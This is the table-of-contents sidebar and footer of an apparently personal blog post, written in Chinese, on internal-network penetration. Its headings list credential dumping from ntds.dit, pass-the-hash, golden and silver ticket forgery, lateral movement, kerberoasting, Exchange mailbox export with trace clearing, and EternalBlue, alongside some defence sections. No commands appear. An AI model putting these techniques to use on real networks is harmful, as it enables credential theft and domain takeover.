href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A%E4%BD%BF%E7%94%A8Invoke-DCSync-ps1%E8%84%9A%E6%9C%AC%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96-ntds-dit-%E6%96%87%E4%BB%B6"><span class="toc-article-text">方法四：使用Invoke-DCSync.ps1脚本直接读取 ntds.dit 文件</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94%EF%BC%9A%E4%BD%BF%E7%94%A8QuarksPwDump%E8%AF%BB%E5%8F%96ntds-dit%E6%96%87%E4%BB%B6"><span class="toc-article-text">方法五：使用QuarksPwDump读取ntds.dit文件</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E5%85%AD%EF%BC%9A%E5%88%A9%E7%94%A8Esedbexport%E9%85%8D%E5%90%88ntdsxtract%E8%AF%BB%E5%8F%96ntds-dit%E6%96%87%E4%BB%B6"><span class="toc-article-text">方法六：利用Esedbexport配合ntdsxtract读取ntds.dit文件</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%B8%83%EF%BC%9A%E4%BD%BF%E7%94%A8DSInternals%E8%AF%BB%E5%8F%96ntds-dit%E6%96%87%E4%BB%B6"><span class="toc-article-text">方法七：使用DSInternals读取ntds.dit文件</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8D%95%E6%9C%BA%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E7%9A%84%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5"><span class="toc-article-text">单机密码抓取的防御手段</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Linux%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-article-text">Linux系统密码获取</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MimiPenguin"><span class="toc-article-text">MimiPenguin</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B7%B2%E7%9F%A5WIFI%E5%AF%86%E7%A0%81%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-article-text">已知WIFI密码的获取</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-article-text">哈希传递</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8NTLM-Hash%E8%BF%9B%E8%A1%8C%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-article-text">使用NTLM Hash进行哈希传递</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8AES-256-%E5%AF%86%E9%92%A5%E8%BF%9B%E8%A1%8C%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-article-text">使用AES-256 密钥进行哈希传递</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92"><span class="toc-article-text">票据传递</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE%E5%92%8C%E4%BC%A0%E9%80%92"><span class="toc-article-text">使用mimikatz导出票据和传递</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8kekeo%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE%E5%92%8C%E4%BC%A0%E9%80%92"><span class="toc-article-text">使用kekeo导出票据和传递</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-article-text">黄金票据</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%87%91%E7%A5%A8%E4%BC%AA%E9%80%A0%E5%8E%9F%E7%90%86"><span class="toc-article-text">金票伪造原理</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%89%B9%E7%82%B9"><span class="toc-article-text">黄金票据特点</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%87%91%E7%A5%A8%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-article-text">金票利用条件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%87%91%E7%A5%A8%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-article-text">金票的利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BA-krbtgt-%E7%9A%84-NTLM-Hash"><span class="toc-article-text">导出 krbtgt 的 NTLM Hash</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-article-text">获取基本信息</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%B9%B6%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98"><span class="toc-article-text">制作黄金票据并注入内存</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E9%AA%8C%E8%AF%81%E6%9D%83%E9%99%90"><span class="toc-article-text">验证权限</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#MSF-%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-article-text">MSF 下的利用</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-article-text">黄金票据的防御</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-article-text">白银票据</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%93%B6%E7%A5%A8%E4%BC%AA%E9%80%A0%E5%8E%9F%E7%90%86"><span class="toc-article-text">银票伪造原理</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%89%B9%E7%82%B9"><span class="toc-article-text">白银票据特点</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%93%B6%E7%A5%A8%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-article-text">银票利用条件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%93%B6%E7%A5%A8%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-article-text">银票的利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-2"><span class="toc-article-text">获取基本信息</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%88%B6%E4%BD%9C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0%E6%9C%8D%E5%8A%A1"><span class="toc-article-text">制作白银票据伪造服务</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E4%BC%AA%E9%80%A0-CIFS-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-article-text">伪造 CIFS 服务权限</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E4%BC%AA%E9%80%A0-LDAP-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-article-text">伪造 LDAP 服务权限</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E4%BC%AA%E9%80%A0-HOST%E5%92%8CHTTP-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-article-text">伪造 HOST和HTTP 服务权限</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E4%BC%AA%E9%80%A0-HOST-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-article-text">伪造 HOST 服务权限</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E4%BC%AA%E9%80%A0-HOST%E5%92%8Cwsman-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-article-text">伪造 HOST和wsman 服务权限</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PsExec%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-article-text">PsExec的使用</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#WMI"><span class="toc-article-text">WMI</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#wmic-%E5%91%BD%E4%BB%A4"><span class="toc-article-text">wmic 命令</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#impacket%E5%B7%A5%E5%85%B7%E5%8C%85%E4%B8%AD%E7%9A%84wmiexec-py%E8%84%9A%E6%9C%AC"><span class="toc-article-text">impacket工具包中的wmiexec.py脚本</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#wmiexec-vbs"><span class="toc-article-text">wmiexec.vbs</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Invoke-WmiCommand"><span class="toc-article-text">Invoke-WmiCommand</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Invoke-WMIMethod"><span class="toc-article-text">Invoke-WMIMethod</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#wmic-%E7%9A%84%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4"><span class="toc-article-text">wmic 的其他命令</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SMBExec%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-article-text">SMBExec的使用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#C-%E7%89%88smbexec"><span class="toc-article-text">C++ 版smbexec</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#impacket%E5%B7%A5%E5%85%B7%E5%8C%85%E4%B8%AD%E7%9A%84smbexec-py%E8%84%9A%E6%9C%AC"><span class="toc-article-text">impacket工具包中的smbexec.py脚本</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#smbexec%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="toc-article-text">smbexec工具包</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-article-text">DCOM在远程系统中的使用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#DCOM%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-article-text">DCOM基本介绍</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9C%A8%E6%9C%AC%E5%9C%B0%E9%80%9A%E8%BF%87-DCOM-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-article-text">在本地通过 DCOM 执行命令</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96-DCOM-%E7%A8%8B%E5%BA%8F%E5%88%97%E8%A1%A8"><span class="toc-article-text">获取 DCOM 程序列表</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8-DCOM-%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><span class="toc-article-text">使用 DCOM 执行任意命令</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8-DCOM-%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-article-text">使用 DCOM 在远程主机上执行命令</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SPN%E5%9C%A8%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-article-text">SPN在域环境中的利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SPN%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-article-text">SPN基本介绍</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Kerberos%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-article-text">Kerberos基本介绍</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SPN%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-article-text">SPN相关概念</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B8%B8%E8%A7%81-SPN-%E6%9C%8D%E5%8A%A1"><span class="toc-article-text">常见 SPN 服务</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SPN-%E6%89%AB%E6%8F%8F"><span class="toc-article-text">SPN 扫描</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#setspn%E5%91%BD%E4%BB%A4"><span class="toc-article-text">setspn命令</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Active-Directory-%E6%A8%A1%E5%9D%97"><span class="toc-article-text">Active Directory 模块</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#PowerView%E8%84%9A%E6%9C%AC"><span class="toc-article-text">PowerView脚本</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Powershell-AD-Recon"><span class="toc-article-text">Powershell-AD-Recon</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#kerberoast"><span class="toc-article-text">kerberoast</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#PowerShellery"><span class="toc-article-text">PowerShellery</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Impacket"><span class="toc-article-text">Impacket</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Kerberos-%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-article-text">Kerberos 协议的利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="toc-article-text">用户名枚举</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-article-text">密码喷洒</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#kerberoast-2"><span class="toc-article-text">kerberoast</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Exchange%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%A9%E7%94%A8"><span class="toc-article-text">Exchange邮件服务器利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-article-text">Exchange邮件服务器基本介绍</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Exchange%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%92%E8%89%B2"><span class="toc-article-text">Exchange邮件服务器角色</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%8E%A5%E5%8F%A3%E5%92%8C%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">客户端&#x2F;远程访问接口和协议</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange-%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-article-text">Exchange 服务发现</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange-%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="toc-article-text">Exchange 的基本操作</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange%E5%AF%BC%E5%87%BA%E6%8C%87%E5%AE%9A%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1"><span class="toc-article-text">Exchange导出指定的电子邮箱</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%85%8D%E7%BD%AE%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E6%9D%83%E9%99%90"><span class="toc-article-text">配置用户的导入导出权限</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%AE%BE%E7%BD%AE%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-article-text">设置网络共享文件夹</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BA%E7%94%A8%E6%88%B7%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6"><span class="toc-article-text">导出用户的电子邮件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%AE%A1%E7%90%86%E5%AF%BC%E5%87%BA%E8%AF%B7%E6%B1%82-%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-article-text">管理导出请求(痕迹清除)</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange-%E5%9C%A8%E5%9F%9F%E4%B8%AD%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-article-text">Exchange 在域中的权限</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange-%E6%8E%A5%E5%8F%A3%E5%88%A9%E7%94%A8"><span class="toc-article-text">Exchange 接口利用</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">跨域攻击</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-article-text">常见的跨域攻击方法</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E8%BF%9B%E8%A1%8C%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB"><span class="toc-article-text">利用域信任关系进行跨域攻击</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-article-text">获取域信息</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%AF%86%E9%92%A5%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E5%9F%9F%E6%9D%83%E9%99%90"><span class="toc-article-text">利用域信任密钥获取目标域权限</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8-krbtgt-%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E5%9F%9F%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-article-text">利用 krbtgt 散列值获取目标域的权限</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E6%97%A0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%92%8C-MS-RPRN-%E8%8E%B7%E5%8F%96%E4%BF%A1%E4%BB%BB%E6%9E%97%E6%9D%83%E9%99%90"><span class="toc-article-text">利用无约束委派和 MS-RPRN 获取信任林权限</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">经典漏洞案例</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E8%8C%83"><span class="toc-article-text">永恒之蓝漏洞分析与防范</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Kerberos-%E5%9F%9F%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2014-6324"><span class="toc-article-text">Kerberos 域用户提权漏洞分析(CVE-2014-6324)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PyKEK"><span class="toc-article-text">PyKEK</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#GoldenPac"><span class="toc-article-text">GoldenPac</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#kekeo"><span class="toc-article-text">kekeo</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MSF"><span class="toc-article-text">MSF</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Cobalt-Strike"><span class="toc-article-text">Cobalt Strike</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">内网探测技术</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ping%EF%BC%88%E5%9F%BA%E4%BA%8EICMP%E5%8D%8F%E8%AE%AE%E6%8E%A2%E6%B5%8B%EF%BC%89"><span class="toc-article-text">ping（基于ICMP协议探测）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#nmap%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-article-text">nmap（推荐）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#msf"><span class="toc-article-text">msf</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#fscan%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-article-text">fscan（推荐）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Railgun%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-article-text">Railgun（推荐）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#netspy"><span class="toc-article-text">netspy</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Ladon"><span class="toc-article-text">Ladon</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">内网渗透常用指令与特性</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="toc-article-text">常用指令</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7"><span class="toc-article-text">常用特性</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">鸣谢</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">及辞的小彩蛋</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>
		

</div><!-- row -->





	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2024 Jici
  
      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>    
</p>

  <script src='https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js'></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({theme: 'forest'});
    }
  </script>



<span class="post-meta-divider">|</span>
本站总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;次</span>

<script>
var bszCaller,bszTag;!function(){var c,d,e,a=!1,b=[];ready=function(c){return a||"interactive"===document.readyState||"complete"===document.readyState?c.call(document):b.push(function(){return c.call(this)}),this},d=function(){for(var a=0,c=b.length;c>a;a++)b[a].apply(document);b=[]},e=function(){a||(a=!0,d.call(window),document.removeEventListener?document.removeEventListener("DOMContentLoaded",e,!1):document.attachEvent&&(document.detachEvent("onreadystatechange",e),window==window.top&&(clearInterval(c),c=null)))},document.addEventListener?document.addEventListener("DOMContentLoaded",e,!1):document.attachEvent&&(document.attachEvent("onreadystatechange",function(){/loaded|complete/.test(document.readyState)&&e()}),window==window.top&&(c=setInterval(function(){try{a||document.documentElement.doScroll("left")}catch(b){return}e()},5)))}(),bszCaller={fetch:function(a,b){var c="BusuanziCallback_"+Math.floor(1099511627776*Math.random());window[c]=this.evalCall(b),a=a.replace("=BusuanziCallback","="+c),scriptTag=document.createElement("SCRIPT"),scriptTag.type="text/javascript",scriptTag.defer=!0,scriptTag.src=a,scriptTag.referrerPolicy="no-referrer-when-downgrade",document.getElementsByTagName("HEAD")[0].appendChild(scriptTag)},evalCall:function(a){return function(b){ready(function(){try{a(b),scriptTag.parentElement.removeChild(scriptTag)}catch(c){bszTag.hides()}})}}},bszCaller.fetch("//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback",function(a){bszTag.texts(a),bszTag.shows()}),bszTag={bszs:["site_pv","page_pv","site_uv"],texts:function(a){this.bszs.map(function(b){var c=document.getElementById("busuanzi_value_"+b);c&&(c.innerHTML=a[b])})},hides:function(){this.bszs.map(function(a){var b=document.getElementById("busuanzi_container_"+a);b&&(b.style.display="none")})},shows:function(){this.bszs.map(function(a){var b=document.getElementById("busuanzi_container_"+a);b&&(b.style.display="inline")})}};
</script>


<!-- <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span class="post-meta-divider">|</span>
<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
<span class="post-meta-divider">|</span>
<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->


<div>
<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date(); 
    function createtime() { 
        var grt= new Date("08/12/2023 00:00:00");//在此处修改你的建站时间
        now.setTime(now.getTime()+250); 
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
        document.getElementById("timeDate").innerHTML = "本站已勉强运行 "+dnum+" 天 "; 
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
    } 
    setInterval("createtime()",250);
</script>
<br><br>
<span class="num">及辞已经在本站记录了 123.3k 字</span>
<script>
  document.addEventListener("DOMContentLoaded", function() {
    fetch('/imageCount.json')
      .then(response => response.json())
      .then(data => {
        const imageCount = data.count;
        const imageCountElement = document.getElementById('imageCount');
        imageCountElement.textContent = `共计收录了 ${imageCount} 张图片`;
      })
      .catch(error => {
        console.error('Failed to load image count:', error);
      });
  });
</script>
<br><br>
<span id="imageCount">正在加载图片数目...</span>
</div> </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
